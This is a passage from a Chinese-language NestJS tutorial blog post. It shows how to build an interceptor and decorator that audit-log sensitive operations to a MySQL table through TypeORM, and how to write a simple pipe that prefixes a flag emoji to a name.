href=\"#拦截器-Interceptors\" class=\"headerlink\" title=\"拦截器 Interceptors\"></a>拦截器 Interceptors</h1><p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-4/interceptors.png\" alt=\"interceptors\"></p><p>拦截器工作在 <code>请求前</code> 和 <code>响应后</code>。它的原理和 <code>decorator</code> 类似，不同的是能做全局级别。</p><p>它的应用场景也非常广，例如：接口请求参数和请求结果的数据保存、设计模式中的 adapter 模式 等…</p><p>我们来用它实现敏感信息的数据保存。</p><p>它的原理和 <code>guards</code> 类似, 通过 <code>decorator</code> 加载到内存，知道哪些接口需要敏感操作记录，然后在调用接口时将 入参和结果存入。</p><p>涉及到数据库操作，因此需要新增模块和数据库连接。</p><h2 id=\"新建敏感权限模块\"><a href=\"#新建敏感权限模块\" class=\"headerlink\" title=\"新建敏感权限模块\"></a>新建敏感权限模块</h2><p>新建敏感权限模块，包括 controller、module 和 service<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nest g controller sensitive</span><br><span class=\"line\">nest g module sensitive</span><br><span class=\"line\">nest g service sensitive</span><br></pre></td></tr></table></figure><p></p><h2 id=\"创建-entity-文件\"><a href=\"#创建-entity-文件\" class=\"headerlink\" title=\"创建 entity 文件\"></a>创建 entity 文件</h2><p>新建 <code>sensitive.entity.ts</code> 。</p><p>这里会用到 <code>transformer</code>, 原因是 <code>mysql</code> 底层并没有 <code>Object</code> 类型。需要通过 JS 把它存成 <code>string</code> 格式，在读取时用 <code>object</code> 格式。这样代码就不需要感知是啥类型了。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Entity, Column, PrimaryGeneratedColumn, CreateDateColumn &#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// to 写入数据库</span></span><br><span class=\"line\"><span class=\"comment\">// from 从数据库读取</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> dataTransform = &#123;</span><br><span class=\"line\">    to: <span class=\"function\">(<span class=\"params\">value: <span class=\"built_in\">any</span></span>) =&gt;</span> <span class=\"built_in\">JSON</span>.stringify(value || &#123;&#125;),</span><br><span class=\"line\">    <span class=\"keyword\">from</span>: <span class=\"function\">(<span class=\"params\">value: <span class=\"built_in\">any</span></span>) =&gt;</span> <span class=\"built_in\">JSON</span>.parse(value)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Entity</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> Sensitive &#123;</span><br><span class=\"line\">  <span class=\"meta\">@PrimaryGeneratedColumn</span>()</span><br><span class=\"line\">  id: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'enum'</span>, <span class=\"keyword\">enum</span>: SensitiveType &#125;)</span><br><span class=\"line\">  <span class=\"keyword\">type</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'varchar'</span> &#125;)</span><br><span class=\"line\">  pathname: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'text'</span>, transformer: dataTransform &#125;)</span><br><span class=\"line\">  parameters: <span class=\"built_in\">any</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'text'</span>, transformer: dataTransform &#125;)</span><br><span class=\"line\">  results: <span class=\"built_in\">any</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@CreateDateColumn</span>()</span><br><span class=\"line\">  createDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><h2 id=\"引用数据库\"><a href=\"#引用数据库\" class=\"headerlink\" title=\"引用数据库\"></a>引用数据库</h2><p>和之前介绍数据库一样，在 <code>sensitive.module.ts</code> 中引入数据库<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Module &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveController &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./sensitive.controller'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./sensitive.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Sensitive &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/sensitive.entity'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; TypeOrmModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  controllers: [SensitiveController],</span><br><span class=\"line\">  imports: [TypeOrmModule.forFeature([Sensitive])],</span><br><span class=\"line\">  providers: [Sensitive, SensitiveService],</span><br><span class=\"line\">  exports: [SensitiveService],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> SensitiveModule &#123;&#125;</span><br></pre></td></tr></table></figure><p></p><h2 id=\"service-核心逻辑\"><a href=\"#service-核心逻辑\" class=\"headerlink\" title=\"service 核心逻辑\"></a>service 核心逻辑</h2><p>敏感操作比较简单，service 仅需实现新增和查询。</p><p>先定义敏感操作类型<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/sensitive/constants.ts</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">enum</span> SensitiveType &#123;</span><br><span class=\"line\">    Modify = <span class=\"string\">'Modify'</span>,</span><br><span class=\"line\">    Set = <span class=\"string\">'Set'</span>,</span><br><span class=\"line\">    Create = <span class=\"string\">'Create'</span>,</span><br><span class=\"line\">    Delete = <span class=\"string\">'Delete'</span>,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>在修改 service，引入db操作</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/sensitive/sensitive.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Sensitive &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/sensitive.entity'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; InjectRepository &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Repository &#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> SensitiveService &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@InjectRepository</span>(Sensitive)</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">private</span> readonly sensitiveRepository: Repository&lt;Sensitive&gt;,</span></span><br><span class=\"line\"><span class=\"params\">    </span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> setSensitive(<span class=\"keyword\">type</span>: SensitiveType, pathname: <span class=\"built_in\">string</span>, parameters: <span class=\"built_in\">any</span>, results: <span class=\"built_in\">any</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.sensitiveRepository.save(&#123;</span><br><span class=\"line\">            <span class=\"keyword\">type</span>,</span><br><span class=\"line\">            pathname,</span><br><span class=\"line\">            parameters,</span><br><span class=\"line\">            results,</span><br><span class=\"line\">        &#125;).catch(<span class=\"function\"><span class=\"params\">e</span> =&gt;</span> e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> getSensitive(<span class=\"keyword\">type</span>: SensitiveType) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.sensitiveRepository.find(&#123; </span><br><span class=\"line\">            where: &#123;</span><br><span class=\"line\">                <span class=\"keyword\">type</span>,</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><h2 id=\"controller-修改\"><a href=\"#controller-修改\" class=\"headerlink\" title=\"controller 修改\"></a>controller 修改</h2><p>controller 比较简单，只需要简单的查询即可。敏感信息写入则是通过 decorator + interceptor 来实现</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/sensitive/sensitive.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Controller, Get, Query &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./sensitive.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'sensitive'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> SensitiveController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly sensitiveService: SensitiveService</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'/get-by-type'</span>)</span><br><span class=\"line\">    getSensitive(<span class=\"meta\">@Query</span>(<span class=\"string\">'type'</span>) <span class=\"keyword\">type</span>: SensitiveType) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.sensitiveService.getSensitive(<span class=\"keyword\">type</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><h2 id=\"新增装饰器\"><a href=\"#新增装饰器\" class=\"headerlink\" title=\"新增装饰器\"></a>新增装饰器</h2><p>装饰器的用场来了，只需要告诉某个接口需要敏感操作记录，并指定类型即可。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/decorators</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SetMetadata &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../sensitive/constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> SensitiveOperation = <span class=\"function\">(<span class=\"params\"><span class=\"keyword\">type</span>: SensitiveType</span>) =&gt;</span> SetMetadata(<span class=\"string\">'sensitive-operation'</span>, <span class=\"keyword\">type</span>);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure><p>通过传参的方式，定义敏感操作的类型。在数据库中可以分类，通过索引的方式查找修改入参和结果。</p><h2 id=\"拦截器\"><a href=\"#拦截器\" class=\"headerlink\" title=\"拦截器\"></a>拦截器</h2><p>重点来了！！</p><p>和守卫权限校验类似，通过 <code>reflector</code> 取出内存中的 sensitive-operation 类型。</p><p>新建 <code>src/common/interceptors/sensitive.interceptor.ts</code></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/interceptors/sensitive.interceptor.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable, NestInterceptor, ExecutionContext, CallHandler &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Reflector &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../../sensitive/sensitive.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../../sensitive/constants'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Observable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'rxjs'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; tap &#125; <span class=\"keyword\">from</span> <span class=\"string\">'rxjs/operators'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> SensitiveInterceptor <span class=\"keyword\">implements</span> NestInterceptor &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> reflector: Reflector, <span class=\"keyword\">private</span> sensitiveService: SensitiveService</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  intercept(context: ExecutionContext, next: CallHandler): Observable&lt;<span class=\"built_in\">any</span>&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> request = context.switchToHttp().getRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">type</span> = <span class=\"keyword\">this</span>.reflector.get&lt;SensitiveType | <span class=\"literal\">undefined</span>&gt;(<span class=\"string\">'sensitive-operation'</span>, context.getHandler());</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">type</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>  next.handle();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> next</span><br><span class=\"line\">      .handle()</span><br><span class=\"line\">      .pipe(</span><br><span class=\"line\">        tap(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"keyword\">this</span>.sensitiveService.setSensitive(<span class=\"keyword\">type</span>, request.url, request.body, data)),</span><br><span class=\"line\">      );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>并在 app.module.ts 中引入全局。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app.module.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; APP_GUARD, APP_INTERCEPTOR &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveInterceptor &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./common/interceptors/sensitive.interceptor'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  providers: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      provide: APP_INTERCEPTOR,</span><br><span class=\"line\">      useClass: SensitiveInterceptor,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> AppModule &#123; &#125;</span><br></pre></td></tr></table></figure><p></p><h2 id=\"其他模块引用\"><a href=\"#其他模块引用\" class=\"headerlink\" title=\"其他模块引用\"></a>其他模块引用</h2><p>student 模块引入<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/students/students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveOperation &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/decorators'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../sensitive/constants'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@SensitiveOperation</span>(SensitiveType.Set)</span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'set-student-name'</span>)</span><br><span class=\"line\">    setStudentName(<span class=\"meta\">@User</span>() user: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.setStudent(user);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>仅需要在接口前引入 <code>@SensitiveOperation(SensitiveType.Set)</code> 即可！是不是非常优美。</p><p>再来调用下！<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅ 使用命令行调用</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/<span class=\"built_in\">set</span>-student-name -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx1\"&#125;'</span></span><br><span class=\"line\">// =&gt; &#123;<span class=\"string\">\"name\"</span>:<span class=\"string\">\"gdccwxx1\"</span>,<span class=\"string\">\"id\"</span>:3,<span class=\"string\">\"updateDate\"</span>:<span class=\"string\">\"2021-09-17T05:48:41.685Z\"</span>,<span class=\"string\">\"createDate\"</span>:<span class=\"string\">\"2021-09-17T05:48:41.685Z\"</span>&#125;%</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 打开浏览器</span><br><span class=\"line\">http://localhost:3000/sensitive/get-by-type?<span class=\"built_in\">type</span>=<span class=\"built_in\">set</span></span><br><span class=\"line\">// =&gt; [&#123;</span><br><span class=\"line\">//  id: 1,</span><br><span class=\"line\">//  <span class=\"built_in\">type</span>: <span class=\"string\">\"Set\"</span>,</span><br><span class=\"line\">//  pathname: <span class=\"string\">\"/students/set-student-name\"</span>,</span><br><span class=\"line\">//  parameters: &#123; user: <span class=\"string\">\"gdccwxx1\"</span> &#125;,</span><br><span class=\"line\">//  results: &#123; name: <span class=\"string\">\"gdccwxx1\"</span>, id: 3, updateDate: <span class=\"string\">\"2021-09-17T05:48:41.685Z\"</span>, createDate: <span class=\"string\">\"2021-09-17T05:48:41.685Z\"</span> &#125;,</span><br><span class=\"line\">//  createDate: <span class=\"string\">\"2021-09-17T05:48:41.719Z\"</span></span><br><span class=\"line\">// &#125;]</span><br></pre></td></tr></table></figure><p></p><p>bingo！这样就达到了我们想要的目的！</p><p>在不影响原有业务逻辑的情况下，仅是在接口处做标识的简单调用。实现了 <code>AOP</code> 的调用方式。对老代码的改造和新业务的编写都十分有用。</p><h1 id=\"管道-Pipes\"><a href=\"#管道-Pipes\" class=\"headerlink\" title=\"管道 Pipes\"></a>管道 Pipes</h1><p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-4/pipes.png\" alt=\"pipes\"><br>NestJs <code>Pipes</code> 的概念和 linux <code>shell</code> 的概念非常相似，都是通过前者的输出再做一些事情。</p><p>它的应用场景也非常广，例如：数据转化，数据校验等…</p><p>对数据输入时的操作非常有用。对复杂数据校验，例如表单数据等十分有用。</p><p>我们没有复杂输入，我们来使用简单的数据转化，实现在名字前加上🇨🇳</p><h2 id=\"新建-Pipes\"><a href=\"#新建-Pipes\" class=\"headerlink\" title=\"新建 Pipes\"></a>新建 Pipes</h2><p>新建 <code>src/common/pipes/name.pipes.ts</code>。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/pipes/name.pipes.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; PipeTransform, Injectable, ArgumentMetadata &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> TransformNamePipe <span class=\"keyword\">implements</span> PipeTransform &#123;</span><br><span class=\"line\">  transform(name: <span class=\"built_in\">string</span>, metadata: ArgumentMetadata) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`🇨🇳 <span class=\"subst\">$&#123;name.trim()&#125;</span>`</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>和其他 NestJs 一样，都需要重载一边内置对象。<code>Pipes</code> 也需要重载 <code>PipeTransform</code>。</p><h2 id=\"使用管道\"><a href=\"#使用管道\" class=\"headerlink\" title=\"使用管道\"></a>使用管道</h2><p>在 <code>controller</code> 中使用 <code>pipes</code>。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; TransformNamePipe &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/pipes/name.pipes'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYou(<span class=\"meta\">@Query</span>(<span class=\"string\">'name'</span>, TransformNamePipe) name: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(name);</span><br><span class=\"line\">    &#125;</span><br><span 